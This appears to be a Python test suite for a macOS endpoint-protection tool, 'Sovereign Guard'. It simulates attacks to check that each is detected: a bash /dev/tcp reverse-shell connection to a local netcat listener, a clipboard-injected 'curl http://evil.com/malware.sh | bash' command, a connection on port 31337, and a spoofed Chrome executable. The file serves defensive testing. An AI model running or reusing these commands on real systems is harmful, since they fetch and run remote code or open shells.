import sys
import os
import time
import subprocess
import socket
import tempfile
import json
import path_utils

# Test configuration
TEST_RESULTS = []

def log_test(name, passed, message=""):
    """Log test result"""
    status = "✅ PASS" if passed else "❌ FAIL"
    TEST_RESULTS.append({"name": name, "passed": passed, "message": message})
    print(f"{status}: {name}")
    if message:
        print(f"         {message}")

def test_reverse_shell_detection():
    """Test 1: Reverse Shell Detection"""
    print("\n[TEST 1] Reverse Shell Detection")
    print("=" * 50)
    
    try:
        # Start a netcat listener (simulated C2 server)
        listener = subprocess.Popen(
            ['nc', '-l', '4444'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        time.sleep(1)
        
        # Try to create reverse shell connection
        shell_proc = subprocess.Popen(
            ['bash', '-c', 'exec 3<>/dev/tcp/127.0.0.1/4444; cat <&3'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        time.sleep(2)
        
        # NOTE: 127.0.0.1 is in TRUSTED_NETWORKS by default in patterns.py.
        # This test may fail unless 127.0.0.1 is removed from TRUSTED_NETWORKS.
        if shell_proc.poll() is None:
            shell_proc.kill()
            listener.kill()
            log_test("Reverse Shell Detection", False, "Shell process not killed (Likely due to 127.0.0.1 being whitelisted)")
            return False
        else:
            listener.kill()
            log_test("Reverse Shell Detection", True, "Shell process detected and neutralized")
            return True
            
    except Exception as e:
        log_test("Reverse Shell Detection", False, f"Test error: {e}")
        return False

def test_clipboard_protection():
    """Test 2: Clipboard Hijacking Protection"""
    print("\n[TEST 2] Clipboard Protection")
    print("=" * 50)
    
    try:
        # Test malicious command injection
        malicious_cmd = "curl http://evil.com/malware.sh | bash"
        subprocess.run(['pbcopy'], input=malicious_cmd.encode('utf-8'), check=True)
        time.sleep(2)
        
        # Check if clipboard was sanitized
        clipboard_content = subprocess.check_output(['pbpaste'], text=True)
        
        if "CLIPBOARD VIRUS DETECTED" in clipboard_content or "THREAT DETECTED" in clipboard_content:
            log_test("Clipboard Protection", True, "Malicious command neutralized")
            return True
        else:
            log_test("Clipboard Protection", False, f"Clipboard not protected. Content: {clipboard_content[:50]}...")
            return False
            
    except Exception as e:
        log_test("Clipboard Protection", False, f"Test error: {e}")
        return False

def test_network_monitoring():
    """Test 3: Network Connection Monitoring"""
    print("\n[TEST 3] Network Monitoring")
    print("=" * 50)
    
    try:
        # Create a suspicious outbound connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        
        # Try connecting to a suspicious IP (8.8.8.8 on weird port)
        try:
            sock.connect(('8.8.8.8', 31337))  # Common reverse shell port
            time.sleep(2)
            sock.close()
        except:
            pass
        
        # Check guard_monitor.log for network threat detection
        log_file = path_utils.get_log_file('guard_monitor.log')
        if os.path.exists(log_file):
            with open(log_file, 'r') as f:
                log_content = f.read()
                if 'NETWORK' in log_content and '31337' in log_content:
                    log_test("Network Monitoring", True, "Suspicious connection detected")
                    return True
        
        log_test("Network Monitoring", False, "Network threat not logged")
        return False
        
    except Exception as e:
        log_test("Network Monitoring", False, f"Test error: {e}")
        return False

def test_browser_spoofing_detection():
    """Test 4: Browser Executable Spoofing Detection"""
    print("\n[TEST 4] Browser Spoofing Detection")
    print("=" * 50)
    
    try:
        # Try to run fake Chrome
        # We need to use a name that matches TARGET_PROCESS_NAMES
        # Let's rename the temp file to 'Google Chrome' in /tmp
        fake_chrome_path = os.path.join('/tmp', 'Google Chrome')
        with open(fake_chrome_path, 'w') as f:
            f.write('#!/bin/bash\nsleep 10\n')
        os.chmod(fake_chrome_path, 0o755)
        
        proc = subprocess.Popen([fake_chrome_path])
        time.sleep(3)
        
        # Check if it was killed
        if proc.poll() is None:
            proc.kill()
            if os.path.exists(fake_chrome_path):
                os.unlink(fake_chrome_path)
            log_test("Browser Spoofing Detection", False, "Fake browser not detected")
            return False
        else:
            if os.path.exists(fake_chrome_path):
                os.unlink(fake_chrome_path)
            log_test("Browser Spoofing Detection", True, "Spoofed browser detected")
            return True
            
    except Exception as e:
        log_test("Browser Spoofing Detection", False, f"Test error: {e}")
        return False

def test_learn_mode():
    """Test 5: Learn Mode Functionality"""
    print("\n[TEST 5] Learn Mode")
    print("=" * 50)
    
    try:
        # Check if learning log exists
        learning_log = path_utils.get_config_file('.learning_log.json')
        
        if not os.path.exists(learning_log):
            log_test("Learn Mode", False, "Learning log not created")
            return False
        
        observations = []
        with open(learning_log, 'r') as f:
            for line in f:
                if line.strip():
                    try:
                        observations.append(json.loads(line))
                    except: pass
            
        if len(observations) > 0:
            log_test("Learn Mode", True, f"{len(observations)} processes observed")
            return True
        else:
            log_test("Learn Mode", False, "No learning data")
            return False
            
    except Exception as e:
        log_test("Learn Mode", False, f"Test error: {e}")
        return False

def test_watchdog_recovery():
    """Test 6: Watchdog Self-Healing"""
    print("\n[TEST 6] Watchdog Recovery")
    print("=" * 50)
    
    try:
        # Find monitor PID
        monitor_pid_file = path_utils.get_run_file('monitor_pid.txt')
        
        if not os.path.exists(monitor_pid_file):
            log_test("Watchdog Recovery", False, "Monitor not running")
            return False
        
        with open(monitor_pid_file, 'r') as f:
            monitor_pid = int(f.read().strip())
        
        # Kill the monitor
        os.kill(monitor_pid, 9)
        print("         Killed monitor process...")
        
        # Wait for watchdog to resurrect it
        time.sleep(3)
        
        # Check if resurrected
        if os.path.exists(monitor_pid_file):
            with open(monitor_pid_file, 'r') as f:
                new_pid = int(f.read().strip())
            
            if new_pid != monitor_pid:
                log_test("Watchdog Recovery", True, f"Monitor resurrected (PID: {new_pid})")
                return True
        
        log_test("Watchdog Recovery", False, "Monitor not resurrected")
        return False
        
    except Exception as e:
        log_test("Watchdog Recovery", False, f"Test error: {e}")
        return False

def run_all_tests():
    """Run complete test suite"""
    print("\n" + "=" * 50)
    print("SOVEREIGN GUARD TEST SUITE")
    print("=" * 50)
    
    # Check if Sovereign Guard is running
    pid_file = path_utils.get_run_file('guard_supervisor.pid')
    if not os.path.exists(pid_file):
        print("\n⚠️  WARNING: Sovereign Guard not running")
        print("Start with: ./sovereign start")
        sys.exit(1)
    
    # Run tests
    tests = [
        test_learn_mode,
        test_clipboard_protection,
        test_network_monitoring,
        test_browser_spoofing_detection,
        test_watchdog_recovery,
        test_reverse_shell_detection,
    ]
    
    for test in tests:
        test()
        time.sleep(1)
    
    # Print summary
    print("\n" + "=" * 50)
    print("TEST SUMMARY")
    print("=" * 50)
    
    passed = sum(1 for t in TEST_RESULTS if t['passed'])
    total = len(TEST_RESULTS)
    
    for result in TEST_RESULTS:
        status = "✅" if result['passed'] else "❌"
        print(f"{status} {result['name']}")
    
    print("\n" + "=" * 50)
    print(f"RESULTS: {passed}/{total} tests passed")
    
    if passed == total:
        print("✅ ALL TESTS PASSED - PRODUCTION READY")
        sys.exit(0)
    else:
        print("❌ SOME TESTS FAILED - FIX BEFORE LAUNCH")
        sys.exit(1)

if __name__ == "__main__":
    try:
        run_all_tests()
    except KeyboardInterrupt:
        print("\n\n⚠️  Tests interrupted by user")
        sys.exit(1)
